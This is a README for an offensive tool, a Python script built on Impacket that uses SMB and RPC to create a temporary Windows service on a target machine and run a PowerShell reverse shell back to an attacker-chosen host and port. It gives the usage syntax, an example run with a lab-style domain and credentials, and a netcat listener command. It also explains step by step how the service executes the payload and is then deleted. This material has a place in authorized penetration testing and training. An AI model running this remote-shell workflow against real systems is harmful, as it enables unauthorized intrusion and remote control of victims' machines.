# SMB Remote Service Shell

## Overview

This script leverages SMB and RPC to remotely create, execute, and clean up a Windows service on a target machine. The service runs a PowerShell reverse shell, allowing remote command execution.

## Features

- Uses Impacket to establish an SMB connection and RPC transport
- Creates a temporary Windows service to execute a reverse shell payload
- Deletes the service after execution
- Allows the user to specify local callback host and port for reverse shell

## Prerequisites

- Python 3.x
- Impacket library installed (`pip install impacket`)

## Installation

1. Clone the repository:
   ```sh
   git clone https://github.com/yourrepo/smb-remote-shell.git
   cd smb-remote-shell
   ```
2. Install dependencies:
   ```sh
   pip install -r requirements.txt
   ```

## Usage

Run the script with the following syntax:

```sh
python smb-remote-shell.py <TARGET> <DOMAIN\USERNAME:PASSWORD> -i <LHOST> -p <LPORT>
```

### Example

```sh
python smb-remote-shell.py 192.168.98.120 child.warfare.corp\corpmngr:"User4&*&*" -i 192.168.80.10 -p 8124
```

### Arguments

| Argument        | Description                                            |
| --------------- | ------------------------------------------------------ |
| `<TARGET>`      | Target machine's IP or hostname                        |
| `<CREDENTIALS>` | Login credentials in `domain\username:password` format |
| `-i <LHOST>`    | Local host for the reverse shell callback              |
| `-p <LPORT>`    | Local port for the reverse shell callback              |

## How It Works

1. The script connects to the target using SMB and RPC.
2. It creates a Windows service executing a PowerShell reverse shell.
3. The service starts, executing the payload and connecting back to the attacker's machine.
4. The script waits for user confirmation before cleaning up the service.

## Notes

- Ensure you have a listener set up on the local machine before running the script:
  ```sh
  nc -lvnp <LPORT>
  ```
- Administrator privileges on the target machine are required.
- Use this tool only in authorized environments.

## Disclaimer

This tool is intended for educational and authorized security testing purposes only. Misuse of this script is strictly prohibited.

\
Reference  [https://github.com/fortra/impacket/blob/master/examples/psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
